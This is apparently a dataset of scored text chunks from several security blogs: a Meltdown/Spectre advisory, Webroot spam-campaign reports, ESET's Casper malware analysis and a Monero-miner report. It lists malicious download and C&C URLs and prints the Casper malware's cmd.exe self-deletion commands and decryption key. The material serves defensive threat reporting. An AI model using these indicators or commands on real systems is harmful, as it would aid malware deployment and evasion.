If there’s a silver lining to this (for some, at least) it’s that it appears that access to vulnerable systems or VMs – be that local or remotely via another exploit – is required to implement these attacks against the kernel. While this is scant consolation for suppliers of virtualised infrastructure who may be exposed to malicious actors purchasing cloud-hosted VMs, it does push the actual exploitation of these vulnerabilities into the somewhat more rarefied territory of advanced, persistent threat actors.
Mitigation & recommendations
Patches are being released for major operating systems at the time of writing and, as always, Forcepoint Security Labs strongly recommend adherence to a robust patching policy.
There are, however, some caveats:",0.015946479218423848
"Microsoft have identified that certain antivirus packages make unsupported calls to kernel memory which, after application of the new patch, can cause ‘blue screen’ errors  on both client and server devices;
Microsoft also warn of potential performance impacts after applying the patch, the extent of which is unclear at present. While it seems likely that CPU vendors will already be working hard to mitigate these issues in their next-generation hardware, this will have an ongoing impact until all of the affected hardware is retired – possibly in half a decade or more.",0.00983542288997341
"We will provide updates via this blog and appropriate customer communication channels as more information becomes available.
References",0.014548274234477132
"https://meltdownattack.com/
https://spectreattack.com/spectre.pdf
https://meltdownattack.com/meltdown.pdf
https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html
https://en.wikipedia.org/wiki/Side-channel_attack
https://labs.bitdefender.com/wp-content/uploads/downloads/2014/10/Gaining-kernel-privileges-using-the-Xen-emulator.pdf
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3456
https://newsroom.intel.com/news/intel-responds-to-security-research-findings/
https://support.microsoft.com/en-us/help/4072699/important-information-regarding-the-windows-security-updates-released
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002
",0.011512705227396558
"End and corporate users (and especially Pizza eaters), beware!
Cybercriminals are currently spamvertising hundreds of thousands of emails, impersonating FLORENTINO`s Pizzeria, and enticing  users into clicking on a client-side exploits and malware serving link in order to cancel a $169.90 order that they never really made.",0.014875368725062676
More details:,0.008320251094065867
"Once the user clicks on the link, they will be redirected to a compromised site serving client-side exploits and ultimately dropping multiple malicious binaries on their hosts upon a successful infection.
Malicious URL: hxxp://oldsoccer.it/page1.htm?RANDOM_STRINGS
Client-side exploits used: CVE-2010-0188 and CVE-2012-0507
The malicious URL contains a tiny iFrame pointing to the fast-fluxed domain uiwewsecondary.ru:8080/internet/fpkrerflfvd.php where the client-side exploitation takes place.
The redirection chain is as  follows:
uiwewsecondary.ru:8080/internet/fpkrerflfvd.php -> uiwewsecondary.ru:8080/internet/itbzewhqgrkv.jar -> uiwewsecondary.ru:8080/internet/xrcnenbmdpfzfpx.jar ->uiwewsecondary.ru:8080/internet/kqbzaubpiqxnbn.pdf -> poluicenotgo.ru:8080/internet/at.php?i=8",0.008909279781986301
"The Russian domains are fast-fluxed by the cybercriminals in an attempt to make it harder for security researchers and vendors to take down their campaign. We’ve seen a similar fast-flux technique applied in the following  campaign – “Spamvertised ‘Your tax return appeal is declined’ emails serving client-side exploits and malware“.
Upon successful exploitation the campaign drops the following MD5 on the infected hosts: MD5: 03d874abaaca02b090372eee2d090dc0 detected as Trojan.Generic.KDV.602078; Troj/Agent-VSS.
What happens once the dropped MD5 executes? Basically, it phones back to the following domains/URLs:",0.009966046627248648
"dare2dreamz.com/pony/gate.php
cityweddingguide.com
dynolite.eu
abbott.u4ria.co.za
demircioglubilgisayar.com.tr",0.01252132635438219
It also downloads more malicious binaries from the following compromised URLs:,0.0074259917560846045
"dynolite.eu/7U0ASvP9/AZz.exe
abbott.u4ria.co.za/HGFg1RHz/MkiZMX.exe
demircioglubilgisayar.com.tr/qy3kMMxv/VgWqQm4k.exe",0.01047732181761607
"All the binaries are identical, and have the following MD5, MD5: 97d8f1fa11c86befa069845ffaf818db currently detected as TrojWare.Win32.Kryptik.ADXK by 7 out of 42 antivirus scanners.
Webroot SecureAnywhere customers are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009538375721234948
"Casper Malware: After Babar and Bunny, Another Espionage Cartoon
In this post, we lift the veil on Casper - another piece of software that we believe to have been created by the same organization that is behind Babar and Bunny.",0.014544815485366902
5 Mar 2015 - 01:55PM,0.011721147471366766
"In this post, we lift the veil on Casper – another piece of software that we believe to have been created by the same organization that is behind Babar and Bunny.",0.013217580024708298
"In March 2014, French newspaper Le Monde revealed that France is suspected by the Communications Security Establishment Canada (CSEC) of having developed and deployed malicious software for espionage purposes. This story was based on presentation slides leaked by Edward Snowden, which were then published by Germany’s Der Spiegel in January 2015.",0.013999763859334324
"According to the CSEC presentation, the malicious software in question is called “Babar” by its creators, likely after the famous French cartoon character “Babar The Elephant”. Since then, several malware researchers have begun to work on the enigma that is Babar. Marion Marschalek (Cyphort) struck first, with her report on the “Bunny” malware. Bunny shares some characteristics with the Babar malware described by CSEC. In mid-February, Marion published another report, this time on the actual Babar case, explaining in great detail its spying features. At the same time, Paul Rascagnères (G Data) published a blog post on the similarities between Babar and Bunny, and showed that they were very probably related to the malware described in the CSEC’s slides.",0.017538972515139917
"In this blog post, we lift the veil on another piece of software that we believe to have been created by the same organization that is behind Babar and Bunny. This component is called “Casper” by its authors – presumably named after yet another famous cartoon character.",0.014152717695485872
"Casper was used against Syrian targets in April 2014, which makes it the most recent malware from this group publicly known at this time. To attack their targets, Casper’s operators used zero-day exploits in Adobe Flash, and these exploits were – surprisingly – hosted on a Syrian governmental website. Casper is a well-developed reconnaissance tool, making extensive efforts to remain unseen on targeted machines. Of particular note are the specific strategies adopted against antimalware software.",0.013634576179054836
Context,0.01137302087826575
"In mid-April 2014, Vyacheslav Zakorzhevsky (Kaspersky) observed that the website “jpic.gov.sy” was hosting two Flash zero-day exploits, targeting the vulnerability later labeled CVE-2014-0515. This website was set up in 2011 by the Syrian Justice Ministry apparently to allow Syrian people to ask for reparation for the damage of the civil war. The website is still online and apparently currently clean, although it was defaced in September 2014 by some “hacktivist”.",0.00962443557166226
"At the time of the events, Zakorzhevsky could not retrieve the payloads distributed by these Flash zero-days exploits. ESET researchers were able to find two of these payloads, thanks to ESET LiveGrid® threat telemetry systems. The URLs of these payloads and the dates when they were seen correspond to Zakorzhevsky’s description.",0.014512159952555836
"In a joint effort with Marion Marschalek, Paul Rascagnères, and researchers from the Computer Incident Response Center Luxemboug (CIRCL), we were recently able to determine that the payloads distributed were very likely developed by the same actors who developed the Babar and Bunny software.",0.012428464277888462
Casper Binary Analysis,0.009467134508133745
"The two samples we found are the same core program but differently packaged. The first sample is an executable dropping the core program and making it persistent on the machine. The second is a Windows library that deploys the core program directly into memory, also in the form of a library. In this latter case, the name of the core program library was left visible by its creators: “Casper_DLL.dll”.",0.009975034536242489
"Throughout this blog, we will focus on the first of these two payloads, the second one being similar in terms of behavior.",0.010587152304860181
Dropper,0.007346994522496653
"The dropper is named “domcommon.exe” and its compilation date is set to the June 18th, 2010. This is very likely a forged date, as we will explain later.",0.009913813278230599
"Its execution is based on an XML configuration file decrypted at runtime with the RC4 algorithm and a hardcoded 16-byte key. Before the decryption, the program uses a checksum computation to make sure the memory area containing the decryption key has not been modified. Figure 1 shows the dropper’s decrypted configuration file.",0.01281163543898256
Figure 1 – Casper Dropper Configuration File,0.009613070838111026
Casper Playing Chess against Antivirus,0.010654269533942884
"Firstly, the dropper extracts the <STRATEGY> tag from its configuration file. This tag defines precisely how the malware should behave, depending on which antivirus is present on the machine.",0.013134682595132063
Choosing the appropriate strategy,0.009427324942647308
"First, the dropper retrieves the name of any antivirus that may be running on the machine by executing the Windows Management Instrumentation (WMI) request “SELECT * FROM AntiVirusProduct” and fetching the “displayName” field from the result. If an <AV> tag exists in the configuration file with a “NAME” attribute matching the name of an installed antivirus product, it will be set as the execution strategy. In this case, four antivirus products have a defined strategy.",0.015213927076367817
"If no strategy is found for the running antivirus, or if no antivirus is protecting the computer, the default strategy described in the <STRATEGY> tag’s attributes will be applied. Alternatively, if a file named “strategy.xml” is present in the dropper’s folder, it will override the strategy from the configuration file.",0.012810368769676561
Possible Moves,0.009293221634670057
"A strategy is a set of attributes that influences both the dropper and the payload execution. Some of these attributes define how to realize certain actions, whereas the others define whether to perform certain actions. The following array describes the various “moves” offered by these attributes.",0.013818134065630594
AttributeAttribute PurposePossible ValueValue Meaning,0.01247907824523975
"RUNKEYDefines how the dropper will interact with the Windows registry in order to be persistent on the machineAPICalls to Windows API functions
(RegOpenKeyEx, RegQueryValueEx…)",0.012928996263246728
BATExecution of a batch file containing “reg” commands,0.010657913282279052
REGExecution of “reg” commands in a command prompt process,0.01145024402121575
WMICalls to methods of the StdRegProv WMI class,0.00930185974509401
AUTODELDefines how the dropper will remove itself from the machine after its executionDELExecution of a command line in a command prompt process,0.008045180713785904
APICall to MoveFileEx API function to delete the dropper during the next restart of the system,0.00824307313725281
WMIExecution of a command line in a command prompt process created through the Create method of the Win32_Process WMI class,0.010840992345309108
"INJECTIONDefines whether the dropper and the payload will inject their code into a new process, or execute it in the initial processYES/NON/A",0.008702047055511253
SAFENOTIFDefines whether or not the payload will contact the C&C serverYES/NON/A,0.009635772459673175
"SERVICELikely defines how to interact with Windows services, but the code managing this attribute is missing in these Casper samplesAPIN/A",0.006618236362915919
SCN/A,0.008865136068041957
"ESCAPEDefines whether the dropper will execute normally, or simply exitYES/NON/A",0.00939983892739149
SCHEDULERUnknown. The code managing this attribute is missing in these Casper samplesCMDN/A,0.007716810781089989
The possibilities offered by this <STRATEGY> tag show that Casper’s authors have acquired an in-depth knowledge of behavioral detections in certain antivirus products.,0.01170191699410239
"For example, process injection will only happen on machines with none of the four defined antiviruses running, since in such a case the “INJECTION” attribute will be set to “NO”. Interestingly, three antiviruses have the “ESCAPE” attribute set to “YES”, which means the dropper will simply uninstall itself in their presence without deploying Casper’s payload.",0.011543612512194379
"As the list of <AV> tags is pretty short, we can speculate that these are the antiviruses Casper’s authors expect to find on their targets. For the record, the “VERSION” attribute present in one <AV> tag is actually never used in the code, but it still indicates the intention to distinguish different versions of the same antivirus product. We very rarely see this level of precision employed in malware in order to bypass antivirus.",0.01211959973239296
Time To Drop The Payload,0.012736449667090533
"In the event that the “ESCAPE” attribute is set to “NO” in the chosen strategy – as is the case with the default strategy – the dropper will then execute the commands provided in the form of XML tags in the configuration file, as shown in Figure 2.",0.014701859300608522
Figure 2 – Casper Dropper’s Commands,0.011421354965833519
Uninstalling previous versions,0.008565791520580124
"The first command instructs the dropper to remove other Casper instances that could possibly be running on the system. The corresponding <UNINSTALL> tag comes with a “name” attribute, which will be prefixed with the BIOS constructor name retrieved from the Windows registry (Intel, NEC…) before being used as an identifier. This prefixing is likely meant to avoid drawing the user’s attention if he or she happened to notice the identifier.",0.009190186586244597
"The program is uninstalled in two steps, each step addressing different methods of persistence employed by Casper:",0.008198755242747269
"If it exists, the scheduled task whose name matches the identifier is removed from the system
If it exists, the application registered with the identifier in the Windows registry is removed from the system",0.010593945196058163
Payload installation,0.007475526250181219
"The payload installation is then directed by the <INSTALL> tag, which provides two versions of the payload, one for 32-bit machines (<x86>) and another one for 64-bit machines (<x64>).",0.0072478121660689565
"The attributes of the <INSTALL> tag will then be used by one of the two installation methods previously mentioned. If the operating system is Windows 7 or newer, persistence will be set through a scheduled task; otherwise it will be set through the Windows registry key",0.011716285532726856
“HKLM\Software\Microsoft\Windows\CurrentVersion\Run”.,0.017570062889315397
"The <INSTALL> tag provides an argument to give to the payload. The exact value of the argument is critical to the “correct” execution of the payload. The actual verification in the payload is subtle: the argument is used in a custom algorithm to find library functions in memory. Unless the value is correct, the addresses of these library functions will be wrong, resulting in a random-looking crash of the payload.",0.010335330675474874
Dropper cleans itself,0.008043768830242826
"Before terminating its execution, the dropper removes itself from the system, using the method defined in the AUTODEL attribute. It should be noted that the payload is not launched at this moment: it will be run only at the next startup thanks to the previous persistence method.",0.011578074680713812
Payload,0.009121200219477266
"Similarly to the dropper, Casper payload’s execution is based on an XML configuration file decrypted at run-time, and shown in Figure 3.",0.013433724830360427
Figure 3 – Casper’s Payload Configuration File,0.00968640913944252
"This configuration file starts with a timestamp, which corresponds to Monday, the 7th April 2014 at 21:27:05 GMT. Therefore, the compilation timestamps – set to 2010 – have very likely been forged.",0.011792015844990789
"A series of <PARAM> tags will then control the payload’s behavior, as described in the following array.",0.009929594746018622
attributePurpose,0.009508332349465798
"IDUnknown. It could be used to distinguish operations, as the value is the same in the two payloads hosted on “jpic.gov.sy”.",0.007279692522599968
REGKEYPath in the Windows registry that will be used as storage area,0.007322291792787317
URLC&C server’s URL,0.009784666353189087
KEYCryptographic key for the communications with the C&C server,0.010360874806780274
"DELAYMIN
DELAYMAX
DELAYRETRYTimers to configure the frequency of the contacts with the C&C server",0.011107984301838791
"The payload then generates a unique identifier for the machine and inserts it at the end of the configuration in a <UID> tag. Finally, the configuration is RC4-encrypted and stored in the Windows registry.",0.009642483254139744
"The code handling the configuration shows certain capabilities not exploited in these Casper samples, for example a TIMETOLIVE attribute to plan the termination of Casper after a certain amount of time, or a DELAYED_START attribute to wait before interacting with the system.",0.008024707914204399
"Finally, the payload’s configuration contains the exact same <STRATEGY> as the dropper.",0.010127795815103147
Report to C&C,0.009218932370706923
"During its first execution, Casper’s payload executes the following XML file:",0.009543730531694994
<COMMAND name=’SYSINFO’/>,0.008910712288718647
"The handler of the “SYSINFO” command retrieves information about the system and builds a report containing several sections, as shown in Figure 4.",0.01319794995329493
Figure 4 – SYSINFO Command’s Result,0.009128382449893557
"The titles of the report sections are self-explanatory. Interestingly, the version of the malware is clearly mentioned: 4.4.1. This report is then base64-encoded and sent to the C&C server in the body of an HTTP POST request. It will also be written into a temporary file named “perfaudio.dat”.",0.011110476097595856
"The network request will also have a cookie named “PREF” filled with the concatenation of the machine UID, the configuration ID, the version of Casper and the hardcoded character “R”, all base64-encoded.",0.008647196907090482
C&C’s possible answers,0.01221932604800946
Due to the C&C being down at the time of the investigation we can only speculate on the rest of the execution based on Casper’s known capabilities.,0.010590039153784536
"At this point, the binary regularly contacts the C&C server with a cookie similar to the one in the SYSINFO request, but this time with “G” as the hardcoded character instead of “R”. Our analysis of the binary reveals that the server can then send back a PNG image – with the correct header and format for a PNG file — from which a XML command file will be decrypted and executed.",0.011565310422270492
"In addition to the “SYSINFO” command, Casper can handle <COMMAND> tags with the following values:",0.00740968699822897
"“EXEC” to execute a program on the machine from its local path
“SYSTEM” to execute commands in a Windows command prompt",0.00873187312552337
"Finally, Casper can also handle <PLUGIN> tags, whose content is a Windows executable to deploy on the machine.",0.010894762182154794
How Does Casper Relate to the Other Cartoons?,0.022856372453890716
"Our best chance of establishing that the same developers are behind Bunny, Babar and Casper is to identify unusual code or algorithms shared between these various programs. In our comparison we also take into account the so-called “NBOT” malware (also known as the “TFC” malware), whose link with Babar and Bunny was established by Marion Marschalek in her Babar report. Here is a non-exhaustive list of such shared features we observed:",0.011197230426711169
"Casper hides its calls to API functions by using a hash calculated from the functions’ names, rather than the names themselves. The hashing algorithm is a combination of rotate-left (ROL) of 7 bits and exclusive-or (XOR) operations. NBOT uses the exact same algorithm for the same purpose, whereas Babar hides its API calls in a similar manner but with a different algorithm.",0.025363829188203013
"Casper fetches information about the running antivirus in a way similar to Bunny, Babar, and NBOT, namely through the same WMI request. Moreover, all these malwares compute the SHA-256 hash of the first word of the antivirus name, although in Casper it is actually never used.
Casper generates delimiters for its HTTP requests by filling a specific format string with the results of calls to the GetTickCount API function. The same code is present in some NBOT samples, as shown in the following array.",0.0177252554708337
Extract of Casper’s code,0.00928101118874547
Extract of NBOT’s code,0.009002804434417366
Casper removes its dropper by executing a Windows command created from the following format string:,0.009448410101747129
"cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST “%hs” (DEL “%hs” & SYSTEMINFO) ELSE EXIT",0.021956206779921494
In some NBOT samples we can find the following similar syntax:,0.008502403834022565
"cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST “%s” (DEL “%s” & PING 127.0.0.1 -n 3) ELSE EXIT",0.016752787081276366
"Casper uses an “ID” value set to “13001”, whereas Babar samples contain an ID of “12075-01”. Also, the malware discovered in 2009 by the CSEC possesses an ID of “08184” (slide 8 of the CSEC slides). This similar format, and the increasing value in decimal, could indicate a familial link.",0.01697279203650881
"None of these signs alone is enough to establish a strong link but all the shared features together make us assess with high confidence that Bunny, Babar, NBOT and Casper were all developed by the same organization.",0.014321164072614634
Victimology,0.009046959082612105
"According to our telemetry data, all the people targeted during this operation were located in Syria. These targets may have been the visitors of the “jpic.gov.sy” website — Syrian citizens who want to file a complaint. In this case they could have been redirected to the exploits from a legitimate page of this website.",0.010530215728200232
"But we were actually unable to determine if this were indeed the case. In other words, it is just as likely that the targets have been redirected to the exploits from another location, for example from a hacked legitimate website or from a link in an email. What is known for sure is that the exploits, the Casper binaries and the C&C component were all hosted on this website’s server.",0.00896232904217209
"This leads us to a second hypothesis: the “jpic.gov.sy” website could have been hacked to serve as a storage area. This would have at least two advantages for the attackers: firstly, hosting the files on a Syrian server can make them more easily accessible from Syria, a country whose Internet connection to the outside world has been unstable since the beginning of the civil war, as shown in Google Transparency Report. Secondly, it would mislead attribution efforts by raising suspicion against the Syrian government.",0.01163219648936753
Conclusion,0.008171308922719556
"As previously explained, we are confident that the same group developed Bunny, Babar and Casper. The detailed analysis of Babar in the CSEC slides from 2009 indicates this group is not a newcomer to the espionage business. The use of zero-day exploits is another indication that Casper’s operators belong to a powerful organization. Finally, the narrow targeting of people in Syria shows a likely interest in geopolitics.",0.01214736233672109
"Nevertheless, we did not find any evidence in Casper itself to point a finger at a specific country. In particular, no signs of French origin, as suggested by CSEC for Babar, were found in the binaries.",0.011919026128488053
Hashes,0.008943721272284266
SHA1NoteESET Detection Name,0.012844941519585262
75BF51709B913FDB4086DF78D84C099418F0F449DLL DropperWin32/ProxyBot.B,0.00966664554813812
7F266A5E959BEF9798A08E791E22DF4E1DEA9ED5DLL DropperWin32/ProxyBot.B,0.009745509618190096
E4CC35792A48123E71A2C7B6AA904006343A157AExecutable DropperWin32/ProxyBot.B,0.008618797769047837
F4C39EDDEF1C7D99283C7303C1835E99D8E498B0X86 Executable PayloadWin32/ProxyBot.B,0.009794674068773657
C2CE95256206E0EBC98E237FB73B68AC69843DD5X64 Executable PayloadWin32/ProxyBot.A,0.010033060088265988
Indicators of Compromise,0.0076996116119932845
IndicatorValue,0.008896553815385011
Dropper’s file namedomcommon.exe,0.007274564022866414
Payload’s file nameaiomgr.exe,0.007294861871675606
C&C URLshXXp://jpic.gov.sy/css/images/_cgi/index.php,0.010760077320148165
Mutex name{4216567A-4512-9825-7745F856},0.01051123256775699
Key for configuration decryption7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40,0.00974034967459958
Temporary file nameperfaudio.dat,0.008849891283433386
"Image: PAISAN HOMHUAN / Shutterstock.com
",0.010704744624579376
"2014 and Beyond Online Threat Report
As the end of 2014 is approaching, it is time to look back at some of the big security threats and incidents that took place this year.
Unsurprisingly, attackers have gotten more sophisticated and have gone after bigger targets. Indeed, many small and medium-sized businesses as well as large organisations fell victim to spear phishing attacks and security breaches.
Also, our faith in security standards was severely tested with decades-old vulnerabilities uncovered in major pieces of software that we all rely upon. In many cases, they lead to a frenzy of attacks that took advantage of vulnerable systems.
Again, privacy (or the lack of) was a major source of protests and forced industry giants to beef up their services and provide end-to-end encryption to respond to consumers’ demands to the great distress of many three-letter agencies.
This is also a good time to stop and give some thoughts to what we think might happen in the new year. The so-called ‘security predictions’ are an iffy topic in this industry.
To some people these words make them cringe, while for others they are a source of entertainment.
But security, much like defending against malware, isn’t just about responding to attacks as they come. Anticipating future threats and how to deal with them is an essential part of being prepared and responding well to what might, may or will happen.
2014 in review
There are so many topics to choose from when reflecting on this past year and we can clearly say that the bad guys have kept us very busy on several fronts.
The quantity of new malware samples keeps on growing at a fast pace and the cat and mouse game between security vendors and malware authors is still a daily challenge for both sides.
Unfortunately, this isn’t the only worry when it comes to keeping your computers, phones and tablets secure. Severe vulnerabilities and zero-days show the limits of traditional reactive solutions which while effective, just don’t cut it.
Scams and fraud through social engineering have reached whole new levels. While malware is most feared, potentially unwanted programs and social scams can be just as nasty and leave your wallet a little lighter.
Now let us dig into some of the hottest topics of these past months.
Data breaches: When it rains, it pours
Just like in 2013, large security breaches have made the news all throughout the year, so much so that people have started to complain about ‘breach fatigue’ syndrome.
The massive Target breach was followed by countless others: Home Depot, Michaels, Dairy Queen, Goodwill, Nieman Marcus, JP Morgan Chase, etc. where customer information that included their credit/debit card data was stolen by Point of Sale (PoS) malware.
Security journalist Brian Krebs was busy keeping a tab on all these breaches. The use of outdated and insecure terminals, the lack of chip and PIN technology, as well as social engineering are some of the factors contributing to data breaches.
Cyber-criminals have been keen on targeting PoS with specifically written malware designed to remain stealth but yet exfiltrate sensitive information.
It’s worth noting that nation states are also allegedly involved in data breaches, albeit for other motives such as gathering competitive intelligence or details about critical infrastructure.
Zero days and other vulnerabilities
Major vulnerabilities discovered in 2014 were quickly exploited and the bad guys wreaked havoc on thousands of web servers. More generally, these finds have shaken the trust we place in our devices and technologies.
These flaws inherited interesting names that make them hard to forget as well: Heartbleed, ShellShock, POODLE.
The OpenSSL zero day known as Heartbleed was particularly scary because it allowed an attacker to view and steal passwords or encryption keys from a server in complete transparency.
It also sparked some conversations about whether open source was truly more secure than closed source. After all, these bugs had been laying in plain sight for a number of years without anyone noticing.
On the exploit front, several zero days such as CVE-2014-0515 were used in watering hole attacks before integrating mainstream exploits kits.
Overall, bad guys have become quicker at adapting zero days or new vulnerabilities, sometimes in a matter of days, for example with the Flash CVE-2014-0569 in Fiesta EK.
Malvertising: Trouble in the ad industry
Malicious ads are a major traffic lead generation for exploit kit operators by affecting popular sites and going undetected for several hours.
The complex and layered structure of the ad business coupled with the ease of use and anonymity given to advertisers to bid on impressions are dangerous mixes.
Moreover, the line between legitimate and fraudulent can get very blurry. We caught several ad agencies spreading malware under the table while the big bucks rolled in.
Even legitimate ad networks such as Google’s DoubleClick.net can get caught up in malvertising. Last September, a massive malvertising campaign leveraged DoubleClick to infect users who were browsing mainstream sites.
Tech support scams: How much is enough?
Tech support scams have reached a new high (or low based on your point of view).
The classic cold calls from India still happen but are getting relegated by a flurry of new tricks involving phishing, scareware pages and bogus registry cleaners.
We discovered a Netflix phishing scam that only stole the victim’s credentials but also tricked them into calling a 1-800 number to unlock their account. Once on the phone, users were social engineered into paying hundreds of dollars to fix non-existent problems.
Finally, we uncovered and went after US-based companies that operated large call centres and were duping seniors and non computer savvy users into purchasing premium support packages.
The battle to stop these crooks is hard but progress was made to send a clear message to these scam artists.
Mobile malware
Mobile malware is often underestimated because many people don’t realize that a phone can become infected like a ‘computer’, which is ironic since phones are technically computers albeit with their own operating system.
Yet, more and more people spend time browsing on a smart phone or tablet than they do on a Desktop. That includes doing online banking, storing sensitive information, etc…
This year we saw the ‘port’ to mobile of some of the worst Windows malware such as scareware and ransomware for instance with Koler, the Police Locker. As usual, Android remains the main target for malware authors who manage to shove malicious apps on the Play Store.",0.020623878677480723
Gaming the gamers,0.010087334098885958
"Gamers are not exempt from malware threats despite efforts from gaming companies to protect their customers.
The bad guys are creating malicious applications in order to bypass security defences and disguise them as patches or validation tools. This was the case with fake Steam Guard files that circulated and stole users’ passwords and other details.
Steam was on the forefront many times this year, and more recently with fake screensaver files that circulated through Steam Chat. Unsuspecting gamers that were fooled into opening the ‘picture’ ended up with a nasty Trojan on their PC.",0.01649105978778498
"Looking ahead: 2015
Ah, the security predictions! Everybody loves them, don’t they? Well, we’re not going to use our crystal ball for this one, but instead we, bloggers at Malwarebytes Unpacked, shared some of our thoughts on the trends we think will be most noticeable.",0.021545220422733657
"On the mobile side, we expect ransomware to be a major issue. We have already seen mobile malware variants that encrypt phone data and demand payment to retrieve. Pre-existing phone backup options will make this threat less severe, however many users still might be willing to pay to get their data back.
With more people using mobile devices to bank, it’s becoming more popular for malware authors to exploit. Creating a fake site that looks like a mobile banking site may be a bit easier for cyber criminals since many sites are limited to keep the data processing of the site low.
In the Exploit Kits world, there will be more fileless payloads. In an effort to circumvent detection a special breed of malware doesn’t leave a physical file on the system but rather only runs in memory. This will likely be a trend adopted by new and existing exploit families in 2015 and the antivirus and anti-malware communities will have to quickly adapt to contain the wave.
We expect a major Internet of Things (IoT) attack in the new year against an Internet connected device that was previously not connected. Take for example a thermostat that can be controlled over the internet.
Cloud security is now more important than Desktop security, this is due to the fact that users are uploading tons of personal data like images or documents to ‘cloud’ storage. This makes it easy for an attacker to gain access if they are able to compromise the account. In addition, with the trend of users making purchases, downloading games, songs, movies, etc. through cloud services, the attractiveness of these accounts has increased and we will see more of an effort against gamers and video/music streamers.
Potentially Unwanted Programs (PUPs) are a nuisance to the modern user because of their high requirements for system resources and constant bombardment of advertising.  However, we have seen numerous instances this year of PUPs actually going a step further and installing near-malicious and full-malicious software on the host system.  This trend may very well become more prevalent in the coming year as the war against junk software leads some developers to dabble in illegal activities to make a profit.
Phishers will continue to use sophisticated and effective tactics to get users to hand over their information. It’s also highly likely that, due to the bombardment of Personal Information stealing breaches at large companies, the pool of spear phishing targets will be larger and not just limited to the selected few (like executives).
Accomplishments",0.02105451096176103
"It can be quite depressing to read about security news, but the fight against malware continues more than ever.
While cyber crime pays, it can also land you in jail. Some notable achievements were made in 2014.
We saw the arrest of an entire network responsible for the Blackshades malware, as well as the Shylock banking Trojan. Operating Tovar went after the Gameover ZeuS botnet and caused disruption while also helping people to recover their encrypted files (CryptoLocker).
The FTC investigated several tech support scammers and shutdown a Facebook/Microsoft scam, and more recently announced the temporary restraining order of two Florida-based companies accused of robbing $120 million from their victims.
Perhaps the single most important element in the fight against cyber-crime is the end user. By practicing safe computer habits and protecting themselves with the right tools, people can greatly affect the outcome.
What about you? What do you feel will be the big thing in 2015? Feel free to share your thoughts in the comments section below.
",0.0157563543478485
"Cybercriminals are currently spamvertising LinkedIn themed messages, in an attempt to trick end and corporate users into clicking on the malicious links embedded in the emails.",0.01726162682601906
"The campaign is using real names of LinkedIn users in an attempt to increase the authenticity of the spamvertised campaign.
More details:",0.01168436796235428
"Upon clicking on the malicious link, users are presented with a “Please wait page is loading…” page, whereas the malicious URL will try to exploit the “Help Center URL Validation Vulnerability” also known as CVE-2010-1885.
Sample client-side exploitation structure is as follows:
hxxp://therapower.com/jmwaWRj9/index.html
hxxp://174.133.92.122/MgGsg1Pp/js.js
hxxp://176.28.18.135:8080/showthread.php?t=73a07bcb51f4be71
hxxp://176.28.18.135:8080/content/Qai.jar
hxxp://176.28.18.135:8080/content/ap2.php?f=14095
The campaign is ultimately dropping the following malware sample: MD5: 517a86d7fe88aa53658fab1be7b7ef36. The same IP, 176.28.18.135 was also observed as a command and control served used by the following MD5: 02ce2bb3c0d58c9360bb185d6b200e03.
The cybercriminals behind the campaign are currently relying on thousands of compromised legitimate sites, in an attempt to trick web reputation filters into thinking that the payload is not malicious. Combined with the ever-decreasing price for launching a spam campaign through a botnet, the cybercriminals behind the campaign will definitely break-even from their original investment, and achieve a positive ROI (return on investment).
Webroot’s security researchers will continue monitoring the campaign, to ensure that Webroot SecureAnywhere customers are protected from this threat. Meanwhile, end and corporate users are advised to avoid interacting with the emails, to access the LinkedIn.com directly, and to ensure that they’re not running outdated versions of their third-party applications and browser plugins.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010930069677139831
"Money‑making machine: Monero‑mining malware
While far behind Bitcoin in market capitalization, Monero has several features that make it a very attractive cryptocurrency to be mined by malware.",0.021854798574645007
Peter Kálnai,0.011277099150999503
Michal Poslušný,0.014157683626183415
28 Sep 2017 - 02:54PM,0.01143985070557696
"While far behind Bitcoin in market capitalization, Monero has several features that make it a very attractive cryptocurrency to be mined by malware.",0.019684790887321557
"While the world is holding its breath, wondering where notorious cybercriminal groups like Lazarus or Telebots will strike next with another destructive malware such as WannaCryptor or Petya, there are many other, less aggressive, much stealthier and often very profitable operations going on.",0.0169166035494287
"One such operation has been going on since at least May 2017, with attackers infecting unpatched Windows webservers with a malicious cryptocurrency miner. The goal: use the servers’ computing power to mine Monero (XMR), one of the newer cryptocurrency alternatives to Bitcoin.",0.013209614895345445
"To achieve this, attackers modified legitimate open source Monero mining software and exploited a known vulnerability in Microsoft IIS 6.0 to covertly install the miner on unpatched servers. Over the course of three months, the crooks behind the campaign have created a botnet of several hundred infected servers and made over USD 63,000 worth of Monero.",0.01914345040863541
"ESET customers are protected against any attempts to exploit the CVE-2017-7269 vulnerability, even if their machines aren’t patched against it, as was the case with EternalBlue, the exploit used to spread WannaCryptor.",0.011217682135776896
Why mine Monero and not Bitcoin?,0.01599432206524154
"While far behind Bitcoin in market capitalization, Monero has several features that make it a very attractive cryptocurrency to be mined by malware – untraceable transactions and a proof of work algorithm called CryptoNight, which favors computer or server CPUs and GPUs, in contrast to specialized mining hardware needed for Bitcoin mining.",0.022609253415655117
"We can observe the exchange rate jumping up from 40 USD/XMR up to 150 USD/XMR over the past month, falling back to 100 USD/XMR.",0.025637343362375775
"Figure1. Candlestick chart of the XMR/USD exchange rate in August, 2017",0.01940532743002854
The Cryptominer,0.00826512048028627
"First seen in-the-wild on 26th May, 2017, the malicious mining software is a fork of a legitimate open source Monero CPU miner called xmrig, version 0.8.2 (also released May 26  2017).",0.021239354585835035
"When creating the malicious mining software, the crooks did not apply any changes to the original open source codebase apart from adding hardcoded command line arguments of the attacker’s wallet address and the mining pool URL, plus a few arguments to kill all previously running instances of itself so as not to compete with its new instance. This couldn’t have taken the cybercrooks more than just couple of minutes as suggested by the fact that we saw it in-the-wild on the same day the base version of xmrig was released.",0.012366337528754712
You can see the attacker’s modified cryptominer and its identification with the available source code in the figures below.,0.012404915121601023
Figure2. Code comparison between original and adapted versions,0.00905006474792247
Scanning and Exploitation,0.008190128601508917
